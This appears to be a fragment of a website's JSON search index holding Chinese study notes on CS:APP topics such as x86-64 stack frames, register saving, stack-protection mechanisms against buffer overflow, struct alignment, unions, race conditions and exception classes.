\u8f6c\u79fb\u63a7\u5236"},{"location":"_csapp/1_Basis/3/#3","text":"\u4e3a\u63d0\u9ad8\u6548\u7387\uff0cx86-64 \u4f1a\u5c3d\u53ef\u80fd\u5c11\u5730\u4f7f\u7528\u6808\u5e27\uff0c\u5c40\u90e8\u53d8\u91cf\u5f88\u5c11\u7684\u53f6\u5b50\u51fd\u6570\u751a\u81f3\u4e0d\u9700\u8981\u6808\u5e27\u3002\u6709\u4e9b\u5c40\u90e8\u6570\u636e\u5fc5\u987b\u5b58\u50a8\u5728\u6808\u4e2d: \u5bc4\u5b58\u5668\u4e0d\u8db3\u65f6\u7684\u672c\u5730\u6570\u636e \u88ab & \u53d6\u5730\u5740\u7684\u5c40\u90e8\u53d8\u91cf \u6570\u7ec4\u6216\u7ed3\u6784\u4f53 example original C code long swapAdd ( long * xp , long * yp ) { long x = * xp ; long y = * yp ; * xp = y ; * yp = x ; return x + y ; } long caller () { long arg1 = 534 ; long arg2 = 1057 ; long sum = swapAdd ( & arg1 , & arg2 ); long diff = arg1 - arg2 ; return sum * diff ; } assembly of caller() caller (): subq $16 , %rsp ;allocate 16 bytes movq $534 , ( %rsp ) movq $1057 , 8 ( %rsp ) leaq 8 ( %rsp ), %rsi ;&arg1 movq %rsp , %rdi ;&arg2 call swapAdd movq ( %rsp ), %rdx ;get arg1 subq 8 ( %rsp ), %rdx imulq %rdx , %rax addq $16 , %rsp ;deallocate ret \u8fd0\u884c\u65f6\u6808\u63d0\u4f9b\u4e86\u4e00\u79cd\u7b80\u5355\u7684\u3001\u5728\u9700\u8981\u65f6\u5206\u914d\u3001\u5728\u5b8c\u6210\u65f6\u91ca\u653e\u7684\u673a\u5236\u3002","title":"(3). \u6808\u4e0a\u7684\u5c40\u90e8\u5b58\u50a8"},{"location":"_csapp/1_Basis/3/#4","text":"\u5bc4\u5b58\u5668\u662f\u552f\u4e00\u88ab\u6240\u6709\u8fc7\u7a0b\u5171\u4eab\u7684\u8d44\u6e90\uff0c\u9700\u8981\u4fdd\u8bc1\u88ab\u8c03\u7528\u8005\u4e0d\u4f1a\u8986\u76d6\u8c03\u7528\u8005\u7a0d\u540e\u4f7f\u7528\u7684\u5bc4\u5b58\u5668\u503c\uff0c\u5bf9\u6b64\uff0cx86-64 \u7684\u60ef\u4f8b\u662f: %rbx, %rbp, %r8-%r15 \u9700\u8981\u88ab\u8c03\u7528\u8005\u4fdd\u5b58 \u9664\u4e86 %rsp \u53ca\u4ee5\u4e0a \u7684\u6240\u6709\u5176\u4ed6\u5bc4\u5b58\u5668\u9700\u8981\u8c03\u7528\u8005\u4fdd\u5b58 original C code long Q ( long ); long P ( long x , long y ) { long u = Q ( y ); long v = Q ( x ); return u + v ; } assembly P: pushq %rbp ;save %rbp pushq %rbx ;save %rbx subq $8 , %rsp ;align stack frame movq %rdi , %rbp ;save x movq %rsi , %rdi ;move y to first argument call Q movq %rax , %rbx ;save result=Q(y) movq %rbp , %rdi ;move x to first argument call Q addq %rbx , %rax addq $8 , %rsp ;deallocate last part of stack popq %rbx ;restore %rbx popq %rbp ;restore %rbp ret \u4ece\u4f8b\u5b50\u4e2d\u53ef\u4ee5\u770b\u5230: P \u4f5c\u4e3a callee\uff0c\u9700\u8981\u4fdd\u5b58\u53ca\u6062\u590d\u540e\u7eed\u88ab\u4f7f\u7528\u7684 %rbp, %rbx P \u4f5c\u4e3a caller\uff0c\u9700\u8981\u4fdd\u5b58 %rdi (x) \u548c %rax (u)","title":"(4). \u4fdd\u5b58\u5bc4\u5b58\u5668\u7684\u72b6\u6001"},{"location":"_csapp/1_Basis/3/#2_1","text":"\u7531\u4e8e C \u4e0d\u5bf9\u6570\u7ec4\u8d8a\u754c\u505a\u68c0\u67e5\uff0c\u53ef\u4ee5\u901a\u8fc7\u5b57\u7b26\u4e32\u8986\u76d6\u8fd4\u56de\u5730\u5740\u5e76\u63d2\u5165\u653b\u51fb\u4ee3\u7801\u7684\u5b57\u8282\u7f16\u7801\uff0c\u5b9e\u73b0\u653b\u51fb\u3002","title":"2. \u5bf9\u6297\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb"},{"location":"_csapp/1_Basis/3/#1_2","text":"\u5176\u601d\u60f3\u662f\u968f\u673a\u586b\u5145\u6808\uff0c\u4f7f\u5f97\u6bcf\u6b21\u8fd0\u884c\u65f6\u6808\u7684\u4f4d\u7f6e\u90fd\u6709\u53d8\u5316\u3002\u5728 Linux \u4e2d\uff0c\u8fd9\u79cd\u673a\u5236\u5df2\u88ab\u6cdb\u7528 (\u5730\u5740\u7a7a\u95f4\u5e03\u5c40\u968f\u673a\u5316, ASLR)\uff0c\u7a0b\u5e8f\u4ee3\u7801\u3001\u5e93\u4ee3\u7801\u3001\u6808\u3001\u5168\u5c40\u53d8\u91cf\u548c\u5806\u6570\u636e\u6bcf\u6b21\u8fd0\u884c\u65f6\u90fd\u4f1a\u52a0\u8f7d\u5230\u5185\u5b58\u7684\u4e0d\u540c\u533a\u57df\uff0c\u8fd9\u6837\u53ef\u4ee5\u5bf9\u6297\u4e00\u4e9b\u5f62\u5f0f\u7684\u653b\u51fb\u3002","title":"(1). \u6808\u968f\u673a\u5316"},{"location":"_csapp/1_Basis/3/#2_2","text":"gcc \u9ed8\u8ba4\u4f1a\u52a0\u5165 stack protector \u673a\u5236: \u5728\u5c40\u90e8\u7f13\u51b2\u533a\u548c\u6808\u72b6\u6001\u4e4b\u95f4\u5b58\u50a8\u4e00\u4e2a\u91d1\u4e1d\u96c0\u503c (canary)\uff0c\u7531\u7a0b\u5e8f\u6bcf\u6b21\u8fd0\u884c\u968f\u673a\u4ea7\u751f\uff0c\u5728\u6062\u590d\u5bc4\u5b58\u5668\u72b6\u6001\u4ece\u51fd\u6570\u8fd4\u56de\u4e4b\u524d\uff0c\u7a0b\u5e8f\u4f1a\u68c0\u67e5\u8fd9\u4e2a\u503c\u662f\u5426\u88ab\u4fee\u6539\u3002 void echo () { char buf [ 8 ]; gets ( buf ); } \u5982\u679c\u4e0d\u52a0 -fno-stack-protector \u9009\u9879\uff0c\u8be5\u51fd\u6570\u4f1a\u7f16\u8bd1\u4e3a: echo: subq $24 , %rsp movq %fs : 40 , %rax movq %rax , 8 ( %rsp ) xorl %eax , %eax movq %rsp , %rdi call gets movq 8 ( %rsp ), %rax subq %fs : 40 , %rax jne .L4 addq $24 , %rsp ret .L4: call __stack_chk_fail %fs:40 \u6307\u660e\u91d1\u4e1d\u96c0\u503c\u662f\u7528\u6bb5\u5bfb\u5740\u8bfb\u5165\u7684\uff0c\u8fd4\u56de\u5730\u5740\u5728 %rsp+24 \uff0c\u91d1\u4e1d\u96c0\u503c\u5728 %rsp+8 \u3002","title":"(2). \u6808\u7834\u574f\u68c0\u6d4b"},{"location":"_csapp/1_Basis/3/#3_1","text":"\u9650\u5236\u5185\u5b58\u53ea\u6709\u67d0\u90e8\u5206\u533a\u57df\u53ef\u4ee5\u6267\u884c\uff0c\u5176\u4ed6\u90e8\u5206\u53ea\u80fd\u8bfb\u6216\u5199\u3002","title":"(3). \u9650\u5236\u53ef\u6267\u884c\u4ee3\u7801\u533a\u57df"},{"location":"_csapp/1_Basis/4/","text":"1. struct \ud83e\uddd0 struct \u5c06\u4e0d\u540c\u7c7b\u578b\u7684\u5bf9\u8c61\u805a\u5408\u5230\u4e00\u8d77\uff0c\u7f16\u8bd1\u5668\u7ef4\u62a4\u6bcf\u4e2a\u5b57\u6bb5\u7684\u504f\u79fb\uff0c\u4e14\u9700\u8981\u8003\u8651\u6570\u636e\u5bf9\u9f50: CPU \u6bcf\u6b21\u4ece\u5185\u5b58\u53d6 8 \u4e2a\u5b57\u8282 (\u751a\u81f3\u66f4\u591a) \u7684\u6570\u636e\uff0c\u5982\u679c\u67d0\u4e2a\u5b57\u6bb5\u7684\u5730\u5740\u4e0d\u662f 8 \u7684\u500d\u6570\uff0c\u5c31\u53ef\u80fd\u9700\u8981\u4e24\u6b21\u5185\u5b58\u8bbf\u95ee\uff0c\u4e00\u4e9b\u8001 cpu \u751a\u81f3\u65e0\u6cd5\u5de5\u4f5c (cpu \u548c\u5185\u5b58\u4e4b\u95f4\u63a5\u53e3\u8bbe\u8ba1\u7b80\u5355)\uff1b x86-64 \u65e0\u8bba\u5bf9\u9f50\u4e0e\u5426\u90fd\u80fd\u6b63\u5e38\u5de5\u4f5c\uff0c\u51fa\u4e8e\u6027\u80fd\u8003\u8651\uff0cIntel \u5efa\u8bae\u5bf9\u9f50: $K$ \u5b57\u8282\u7684\u57fa\u672c\u5bf9\u8c61\u7684\u5730\u5740\u662f $K$ \u7684\u500d\u6570 struct S1 { int i ; char c ; int j ; char d ;} S1 : [ 0 , 4 , 8 , 12 > 16 ] struct S2 { int i ; char c ; char d ; long j ; } S2 : [ 0 , 4 , 5 , 8 > 16 ] struct S3 { short w [ 3 ]; char c [ 3 ]; } S3 : [ 0 , 6 > 10 ] struct S4 { struct S3 a [ 2 ]; struct S2 t ; } S4 : [ 0 , 24 > 40 ] \u7ed3\u6784\u4f53\u5c3e\u90e8\u7684\u5bf9\u9f50\u53ea\u9700\u8981\u8003\u8651\u540c\u7c7b\u578b\u7684\u6570\u7ec4\uff0c\u5176\u4ed6\u7684\u5bf9\u9f50\u9700\u8981\u8003\u8651\u6bcf\u4e2a\u57fa\u672c\u7c7b\u578b\u5355\u5143\u3002 \u8ba1\u7b97\u5bf9\u9f50\u5927\u5c0f\uff0c\u7ed9\u51fa\u5360\u7528\u7a7a\u95f4\u6700\u5c0f\u7684\u6392\u5217 struct S4 { char * a ; short b ; double c ; char d ; float e ; char f ; long g ; int h ; }; 56\uff0c\u4ece\u5927\u5230\u5c0f\u4f9d\u6b21\u6392\u5217\u540e\u4e3a 40 \u7f16\u8bd1\u5668\u5e76\u4e0d\u4f1a\u81ea\u52a8\u4f18\u5316\u7ed3\u6784\u5355\u5143\u7684\u987a\u5e8f\uff0c\u5b9e\u9645\u8bbe\u8ba1\u7ed3\u6784\u4f53\u65f6\u9700\u8981\u624b\u52a8\u8bbe\u7f6e\u3002 2. union \ud83e\uddd0 \u8054\u5408\u7528\u4e0d\u540c\u7684\u5b57\u6bb5\u5f15\u7528\u76f8\u540c\u7684\u5185\u5b58\u5757\uff0c\u8fd9\u79cd\u673a\u5236\u6709\u65f6\u5f88\u6709\u7528\u3002 \u5b9e\u73b0\u4e00\u79cd\u4e8c\u53c9\u6811\u7ed3\u6784\uff0c\u6bcf\u4e2a\u53f6\u5b50\u7ed3\u70b9\u53ea\u6709\u4e24\u4e2a double \uff0c\u6bcf\u4e2a\u5185\u7ed3\u70b9\u53ea\u6709\u4e24\u4e2a\u6307\u9488\uff0c\u8981\u6c42\u53f6\u5b50\u548c\u5185\u7ed3\u70b9\u7528\u540c\u4e00\u7c7b\u578b\uff0c\u4e14\u6709\u65b9\u6cd5\u5224\u65ad\u67d0\u4e2a\u7ed3\u70b9\u662f\u4e0d\u662f\u53f6\u5b50 typedef enum { N_LEAF , N_INTERNAL } nodetype_t ; struct node_t { nodetype_t type ; union { struct { struct node_t * left ; struct node_t * right ; } internal ; double data [ 2 ]; } info ; }; \u8054\u5408\u53ef\u7528\u4e8e\u8bbf\u95ee\u4e0d\u540c\u6570\u636e\u7c7b\u578b\u7684\u4f4d\u6a21\u5f0f\u3002 \u628a double \u7684\u4f4d\u6a21\u5f0f\u8f6c\u6362\u5230 long \u4e2d (\u6ce8\u610f unsigned long u = (unsigned long) d \u4f1a\u6839\u636e\u6570\u503c\u5f3a\u5236\u8f6c\u6362) unsigned long double2bits ( double d ) { union { double d ; unsigned long u ; } temp ; temp . d = d ; return temp . u ; }","title":"4. struct"},{"location":"_csapp/1_Basis/4/#1-struct","text":"struct \u5c06\u4e0d\u540c\u7c7b\u578b\u7684\u5bf9\u8c61\u805a\u5408\u5230\u4e00\u8d77\uff0c\u7f16\u8bd1\u5668\u7ef4\u62a4\u6bcf\u4e2a\u5b57\u6bb5\u7684\u504f\u79fb\uff0c\u4e14\u9700\u8981\u8003\u8651\u6570\u636e\u5bf9\u9f50: CPU \u6bcf\u6b21\u4ece\u5185\u5b58\u53d6 8 \u4e2a\u5b57\u8282 (\u751a\u81f3\u66f4\u591a) \u7684\u6570\u636e\uff0c\u5982\u679c\u67d0\u4e2a\u5b57\u6bb5\u7684\u5730\u5740\u4e0d\u662f 8 \u7684\u500d\u6570\uff0c\u5c31\u53ef\u80fd\u9700\u8981\u4e24\u6b21\u5185\u5b58\u8bbf\u95ee\uff0c\u4e00\u4e9b\u8001 cpu \u751a\u81f3\u65e0\u6cd5\u5de5\u4f5c (cpu \u548c\u5185\u5b58\u4e4b\u95f4\u63a5\u53e3\u8bbe\u8ba1\u7b80\u5355)\uff1b x86-64 \u65e0\u8bba\u5bf9\u9f50\u4e0e\u5426\u90fd\u80fd\u6b63\u5e38\u5de5\u4f5c\uff0c\u51fa\u4e8e\u6027\u80fd\u8003\u8651\uff0cIntel \u5efa\u8bae\u5bf9\u9f50: $K$ \u5b57\u8282\u7684\u57fa\u672c\u5bf9\u8c61\u7684\u5730\u5740\u662f $K$ \u7684\u500d\u6570 struct S1 { int i ; char c ; int j ; char d ;} S1 : [ 0 , 4 , 8 , 12 > 16 ] struct S2 { int i ; char c ; char d ; long j ; } S2 : [ 0 , 4 , 5 , 8 > 16 ] struct S3 { short w [ 3 ]; char c [ 3 ]; } S3 : [ 0 , 6 > 10 ] struct S4 { struct S3 a [ 2 ]; struct S2 t ; } S4 : [ 0 , 24 > 40 ] \u7ed3\u6784\u4f53\u5c3e\u90e8\u7684\u5bf9\u9f50\u53ea\u9700\u8981\u8003\u8651\u540c\u7c7b\u578b\u7684\u6570\u7ec4\uff0c\u5176\u4ed6\u7684\u5bf9\u9f50\u9700\u8981\u8003\u8651\u6bcf\u4e2a\u57fa\u672c\u7c7b\u578b\u5355\u5143\u3002 \u8ba1\u7b97\u5bf9\u9f50\u5927\u5c0f\uff0c\u7ed9\u51fa\u5360\u7528\u7a7a\u95f4\u6700\u5c0f\u7684\u6392\u5217 struct S4 { char * a ; short b ; double c ; char d ; float e ; char f ; long g ; int h ; }; 56\uff0c\u4ece\u5927\u5230\u5c0f\u4f9d\u6b21\u6392\u5217\u540e\u4e3a 40 \u7f16\u8bd1\u5668\u5e76\u4e0d\u4f1a\u81ea\u52a8\u4f18\u5316\u7ed3\u6784\u5355\u5143\u7684\u987a\u5e8f\uff0c\u5b9e\u9645\u8bbe\u8ba1\u7ed3\u6784\u4f53\u65f6\u9700\u8981\u624b\u52a8\u8bbe\u7f6e\u3002","title":"1. struct"},{"location":"_csapp/1_Basis/4/#2-union","text":"\u8054\u5408\u7528\u4e0d\u540c\u7684\u5b57\u6bb5\u5f15\u7528\u76f8\u540c\u7684\u5185\u5b58\u5757\uff0c\u8fd9\u79cd\u673a\u5236\u6709\u65f6\u5f88\u6709\u7528\u3002 \u5b9e\u73b0\u4e00\u79cd\u4e8c\u53c9\u6811\u7ed3\u6784\uff0c\u6bcf\u4e2a\u53f6\u5b50\u7ed3\u70b9\u53ea\u6709\u4e24\u4e2a double \uff0c\u6bcf\u4e2a\u5185\u7ed3\u70b9\u53ea\u6709\u4e24\u4e2a\u6307\u9488\uff0c\u8981\u6c42\u53f6\u5b50\u548c\u5185\u7ed3\u70b9\u7528\u540c\u4e00\u7c7b\u578b\uff0c\u4e14\u6709\u65b9\u6cd5\u5224\u65ad\u67d0\u4e2a\u7ed3\u70b9\u662f\u4e0d\u662f\u53f6\u5b50 typedef enum { N_LEAF , N_INTERNAL } nodetype_t ; struct node_t { nodetype_t type ; union { struct { struct node_t * left ; struct node_t * right ; } internal ; double data [ 2 ]; } info ; }; \u8054\u5408\u53ef\u7528\u4e8e\u8bbf\u95ee\u4e0d\u540c\u6570\u636e\u7c7b\u578b\u7684\u4f4d\u6a21\u5f0f\u3002 \u628a double \u7684\u4f4d\u6a21\u5f0f\u8f6c\u6362\u5230 long \u4e2d (\u6ce8\u610f unsigned long u = (unsigned long) d \u4f1a\u6839\u636e\u6570\u503c\u5f3a\u5236\u8f6c\u6362) unsigned long double2bits ( double d ) { union { double d ; unsigned long u ; } temp ; temp . d = d ; return temp . u ; }","title":"2. union"},{"location":"_csapp/1_Basis/outline/","text":"","title":"_outline_"},{"location":"_csapp/_Conc/1/","text":"1. OS \u4e0e\u5e76\u53d1 \ud83e\uddd0 code for ( int i = 0 ; i < 1e7 ; ++ i ) { counter = counter + 1 ; } asm mov 0x8049a1c , %eax add 0x1 , %eax mov %eax , 0x8049a1c \u5047\u8bbe\u6709\u4e24\u4e2a\u7ebf\u7a0b\u8fd0\u884c\u8be5\u4ee3\u7801\uff0c\u7ebf\u7a0b 1 \u5728 add \u5904\u9047\u5230\u65f6\u949f\u4e2d\u65ad\uff0c\u8c03\u5ea6\u7ebf\u7a0b 2 \u8fd0\u884c\uff0c\u5c31\u4f1a\u5bfc\u81f4 bug \u7ade\u6001\u6761\u4ef6 (race condition): \u591a\u4e2a\u8fdb/\u7ebf\u7a0b\u7ade\u4e89\u8d44\u6e90\u800c\u51fa\u73b0\u95ee\u9898 (\u4f8b\u5982\u4e0a\u4f8b) \u4e34\u754c\u533a (critical section): \u5bfc\u81f4\u9759\u6001\u6761\u4ef6\u7684\u4ee3\u7801\u533a\uff0c\u8be5\u533a\u4e0d\u80fd\u7531\u591a\u4e2a\u7ebf\u7a0b\u540c\u65f6\u6267\u884c \u4e92\u65a5 (mutual exclusion): \u540c\u4e00\u65f6\u523b\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u6267\u884c\u4e34\u754c\u533a \u5e94\u7528\u7a0b\u5e8f\u9700\u8981\u4ee5\u540c\u6b65\u548c\u53d7\u63a7\u7684\u65b9\u5f0f\u8bbf\u95ee\u4e34\u754c\u533a\uff0c\u4e3a\u6b64\u9700\u8981 OS \u548c\u786c\u4ef6\u7684\u652f\u6301 \u5982\u679c\u4e34\u754c\u533a\u5f88\u77ed\uff0c\u5047\u5982\u53ef\u4ee5\u5c06\u5176\u538b\u7f29\u4e3a\u4e00\u6761\u6307\u4ee4 (\u5982\u4e0a\u4f8b\u53ef\u521b\u9020\u4e00\u4e2a memory-add )\uff0c\u4e0d\u4f1a\u88ab\u4e2d\u65ad\uff0c\u4fdd\u8bc1\u4e86\u539f\u5b50\u6027\uff0c\u6b64\u5373\u540c\u6b65\u539f\u8bed \u4f46\u5e76\u975e\u6240\u6709\u4e34\u754c\u533a\u90fd\u53ef\u538b\u7f29\uff0c\u56e0\u6b64 OS \u9700\u8981\u63d0\u4f9b\u9501\u673a\u5236\uff0c\u9501\u672c\u8eab\u9700\u8981\u540c\u6b65\u539f\u8bed\u5b9e\u73b0 OS \u672c\u8eab\u4e5f\u662f\u4e00\u4e2a\u5e76\u53d1\u7a0b\u5e8f (\u4f8b\u5982\u4e24\u4e2a\u8fdb\u7a0b\u540c\u65f6\u5199\u5165\u4e00\u4e2a\u6587\u4ef6)","title":"1. 1"},{"location":"_csapp/_Conc/1/#1-os","text":"code for ( int i = 0 ; i < 1e7 ; ++ i ) { counter = counter + 1 ; } asm mov 0x8049a1c , %eax add 0x1 , %eax mov %eax , 0x8049a1c \u5047\u8bbe\u6709\u4e24\u4e2a\u7ebf\u7a0b\u8fd0\u884c\u8be5\u4ee3\u7801\uff0c\u7ebf\u7a0b 1 \u5728 add \u5904\u9047\u5230\u65f6\u949f\u4e2d\u65ad\uff0c\u8c03\u5ea6\u7ebf\u7a0b 2 \u8fd0\u884c\uff0c\u5c31\u4f1a\u5bfc\u81f4 bug \u7ade\u6001\u6761\u4ef6 (race condition): \u591a\u4e2a\u8fdb/\u7ebf\u7a0b\u7ade\u4e89\u8d44\u6e90\u800c\u51fa\u73b0\u95ee\u9898 (\u4f8b\u5982\u4e0a\u4f8b) \u4e34\u754c\u533a (critical section): \u5bfc\u81f4\u9759\u6001\u6761\u4ef6\u7684\u4ee3\u7801\u533a\uff0c\u8be5\u533a\u4e0d\u80fd\u7531\u591a\u4e2a\u7ebf\u7a0b\u540c\u65f6\u6267\u884c \u4e92\u65a5 (mutual exclusion): \u540c\u4e00\u65f6\u523b\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u6267\u884c\u4e34\u754c\u533a \u5e94\u7528\u7a0b\u5e8f\u9700\u8981\u4ee5\u540c\u6b65\u548c\u53d7\u63a7\u7684\u65b9\u5f0f\u8bbf\u95ee\u4e34\u754c\u533a\uff0c\u4e3a\u6b64\u9700\u8981 OS \u548c\u786c\u4ef6\u7684\u652f\u6301 \u5982\u679c\u4e34\u754c\u533a\u5f88\u77ed\uff0c\u5047\u5982\u53ef\u4ee5\u5c06\u5176\u538b\u7f29\u4e3a\u4e00\u6761\u6307\u4ee4 (\u5982\u4e0a\u4f8b\u53ef\u521b\u9020\u4e00\u4e2a memory-add )\uff0c\u4e0d\u4f1a\u88ab\u4e2d\u65ad\uff0c\u4fdd\u8bc1\u4e86\u539f\u5b50\u6027\uff0c\u6b64\u5373\u540c\u6b65\u539f\u8bed \u4f46\u5e76\u975e\u6240\u6709\u4e34\u754c\u533a\u90fd\u53ef\u538b\u7f29\uff0c\u56e0\u6b64 OS \u9700\u8981\u63d0\u4f9b\u9501\u673a\u5236\uff0c\u9501\u672c\u8eab\u9700\u8981\u540c\u6b65\u539f\u8bed\u5b9e\u73b0 OS \u672c\u8eab\u4e5f\u662f\u4e00\u4e2a\u5e76\u53d1\u7a0b\u5e8f (\u4f8b\u5982\u4e24\u4e2a\u8fdb\u7a0b\u540c\u65f6\u5199\u5165\u4e00\u4e2a\u6587\u4ef6)","title":"1. OS \u4e0e\u5e76\u53d1"},{"location":"_csapp/_ECF/1/","text":"1. \u5f02\u5e38 \ud83e\uddd0 (1). \u76f4\u63a5\u6267\u884c\u7684\u95ee\u9898 \ud83e\uddd0 \u5f02\u5e38\u662f\u4e00\u79cd ECF\uff0cOS \u901a\u8fc7\u5f02\u5e38\u89e3\u51b3\u76f4\u63a5\u6267\u884c\u9762\u4e34\u7684\u4ee5\u4e0b\u95ee\u9898 \u6743\u9650\u63a7\u5236: \u7528\u6237\u7a0b\u5e8f\u4e0d\u80fd\u5b8c\u5168\u63a7\u5236\u7cfb\u7edf\uff0c\u4f46\u4e5f\u9700\u8981\u4e00\u4e9b\u53d7\u9650\u7684\u64cd\u4f5c \u89e3\u51b3: OS \u901a\u8fc7\u5f02\u5e38\u5206\u5272\u5185\u6838\u6001\u548c\u7528\u6237\u6001 \u9677\u5165\u5f02\u5e38\u540e\uff0c\u5185\u6838\u8bbe\u7f6e\u5904\u7406\u5668\u7684\u67d0\u4e2a\u4f4d\uff0c\u8fdb\u5165\u7279\u6743\u6a21\u5f0f \u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u6267\u884c\u7279\u6743\u64cd\u4f5c \u8fdb\u7a0b\u5207\u6362: \u4e2d\u95f4\u4e00\u6bb5\u4ee3\u7801\u662f\u7528\u6237\u4ee3\u7801\uff0c\u5728 cpu \u672a\u6267\u884c OS \u4ee3\u7801\u7684\u60c5\u51b5\u4e0b\u65e0\u6cd5\u5207\u6362\u8fdb\u7a0b \u89e3\u51b3: \u9677\u5165\u5f02\u5e38\u540e\uff0c\u5c31\u6267\u884c\u4e86 OS \u7684\u4ee3\u7801 \u88ab\u52a8: \u7528\u6237\u6267\u884c\u7cfb\u7edf\u8c03\u7528\u8fdb\u884c\u5207\u6362\uff0c\u4f46\u65e0\u6cd5\u5e94\u5bf9\u7528\u6237\u7a0b\u5e8f\u6b7b\u5faa\u73af\u7684\u60c5\u51b5 \u4e3b\u52a8: \u65f6\u949f\u4e2d\u65ad\uff0cOS \u5f00\u673a\u542f\u52a8\u65f6\u949f\uff0c\u63a7\u5236\u65f6\u949f\u8bbe\u5907\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u53d1\u9001\u4e00\u6b21\u4e2d\u65ad (2). \u5f02\u5e38\u8868 \ud83e\uddd0 \u5f02\u5e38\u53f7\u4e00\u90e8\u5206\u7531 cpu \u8bbe\u8ba1\u8005\u5206\u914d\uff0c\u53e6\u4e00\u90e8\u5206\u7531 OS kernel \u8bbe\u8ba1\u8005\u5206\u914d\uff0c\u4e14\u7528\u6237\u65e0\u6cd5\u8bbf\u95ee \u7cfb\u7edf\u542f\u52a8\u65f6\uff0c\u7cfb\u7edf\u5904\u4e8e\u5185\u6838\u6001\uff0cOS \u521d\u59cb\u5316\u5f02\u5e38\u8868\uff0c\u8868\u76ee $k$ \u6307\u5411\u76f8\u5e94\u7684 handler \u7cfb\u7edf\u6267\u884c\u67d0\u7a0b\u5e8f\u65f6\uff0ccpu \u68c0\u6d4b\u5230\u5f02\u5e38\u4e8b\u4ef6\u3001\u786e\u5b9a\u5f02\u5e38\u53f7 $k$ \u5e76\u8c03\u7528 handler (3). \u5f02\u5e38\u5206\u7c7b \ud83e\uddd0 Class Cause Async/Sync Return Behavior Interrupt Signal from I/O device \u5f02\u6b65 \u603b\u662f\u8fd4\u56de\u5230\u4e0b\u4e00\u6761\u6307\u4ee4 Trap Intentional \u540c\u6b65 \u603b\u662f\u8fd4\u56de\u5230\u4e0b\u4e00\u6761\u6307\u4ee4 Fault Potentially recoverable error \u540c\u6b65 \u53ef\u80fd\u8fd4\u56de\u5230\u5f53\u524d\u6307\u4ee4 Abort Nonrecoverable error \u540c\u6b65 \u4e0d\u4f1a\u8fd4\u56de \u4e2d\u65ad\u7531\u5916\u90e8 I/O \u8bbe\u5907\u7684\u4fe1\u53f7\u5bfc\u81f4\uff0c\u4e0e\u6307\u4ee4\u65e0\u5173\uff0c\u56e0\u6b64\u662f\u5f02\u6b65\u7684\u3002\u6267\u884c\u903b\u8f91: I/O \u8bbe\u5907\u5411 cpu \u4e00\u4e2a\u5f15\u811a\u53d1\u4fe1\u53f7\uff0c\u5e76\u5c06\u5f02\u5e38\u53f7\u653e\u5230\u7cfb\u7edf\u603b\u7ebf\u4e0a (\u8be5\u5f02\u5e38\u53f7\u6807\u8bc6\u5f15\u8d77\u4e2d\u65ad\u7684\u8bbe\u5907) \u5f53\u524d\u6307\u4ee4\u6267\u884c\u5b8c\u6210\u540e\uff0ccpu \u6ce8\u610f\u5230\u5f15\u811a\u7535\u538b\u53d8\u9ad8\uff0c\u4ece\u603b\u7ebf\u8bfb\u53d6\u5f02\u5e38\u53f7\u5e76\u8c03\u7528 handler \u63a7\u5236\u8fd4\u56de\u7ed9\u4e0b\u4e00\u6761\u6307\u4ee4\uff0c\u4eff\u4f5b\u4ec0\u4e48\u4e5f\u6ca1\u53d1\u751f \u9677\u9631\u5373\u7cfb\u7edf\u8c03\u7528\uff0cLinux \u63d0\u4f9b\u51e0\u767e\u79cd\u7cfb\u7edf\u8c03\u7528 (32 ~ 255) C \u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7 syscall \u51fd\u6570\u76f4\u63a5\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u4f46\u6807\u51c6 C \u5e93\u6709\u5927\u591a\u6570\u7cfb\u7edf\u8c03\u7528\u7684 wrapper x86-64 \u901a\u8fc7 syscall \u6307\u4ee4\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u6240\u6709\u53c2\u6570\u53ea\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u9012\uff0c\u4f20\u9012\u89c4\u5219\u548c\u51fd\u6570\u76f8\u540c \u6545\u969c\u548c\u7ec8\u6b62 \u6545\u969c\u7531\u9519\u8bef\u60c5\u51b5\u5f15\u8d77\uff0c\u5982\u679c handler \u53ef\u4ee5\u4fee\u6b63\uff0c\u63a7\u5236\u8fd4\u56de\u5230\u5f15\u8d77\u6545\u969c\u7684\u6307\u4ee4\uff0c\u5426\u5219\u5c31\u8c03\u7528\u5185\u6838\u7684 abort routine\uff0c\u7ec8\u6b62\u5f15\u8d77\u9519\u8bef\u7684\u5e94\u7528\u7a0b\u5e8f \u7ec8\u6b62\u901a\u5e38\u662f\u81f4\u547d\u7684\u786c\u4ef6\u9519\u8bef\uff0c\u4f8b\u5982 DRAM / SRAM \u4f4d\u635f\u574f\u9020\u6210\u7684\u5947\u5076\u9519\u8bef\uff0chandler \u4e0d\u4f1a\u5c1d\u8bd5\u8fd4\u56de\uff0c\u76f4\u63a5\u5c06\u63a7\u5236\u4ea4\u7ed9 abort routine Linux/x86-64 \u5e38\u89c1\u7684 \u6545\u969c/\u7ec8\u6b62 \u4e3e\u4f8b Exception Number Description Exception Class 0 Divide error Fault 13 General protection fault Fault 14 Page fault Fault 18 Machine check Abort \u9664\u6cd5\u9519\u8bef: \u9664\u4ee5 0 \u6216 \u9664\u6cd5\u6307\u4ee4\u7684\u7ed3\u679c\u5bf9\u4e8e\u76ee\u6807\u64cd\u4f5c\u6570\u592a\u5927\u3002Unix \u4e0d\u4f1a\u5c1d\u8bd5\u6062\u590d \u4e00\u822c\u4fdd\u62a4\u6545\u969c: \u5f15\u7528\u672a\u5b9a\u4e49\u865a\u5b58\u533a\u57df\u6216\u5c1d\u8bd5\u5199\u5165\u53ea\u8bfb\u533a\uff0cLinux \u4e0d\u4f1a\u5c1d\u8bd5\u6062\u590d\uff0c\u4e00\u822c\u62a5\u544a\u4e3a\u6bb5\u9519\u8bef \u673a\u5668\u68c0\u67e5: \u81f4\u547d\u7684\u786c\u4ef6\u9519\u8bef 2. \u8fdb\u7a0b \ud83e\uddd0 \u8fdb\u7a0b\u662f\u8ba1\u7b97\u673a\u79d1\u5b66\u4e2d\u6700\u6df1\u523b\u3001\u6700\u6210\u529f\u7684\u6982\u5ff5\u4e4b\u4e00\u3002\u4e0d\u5173\u6ce8 OS 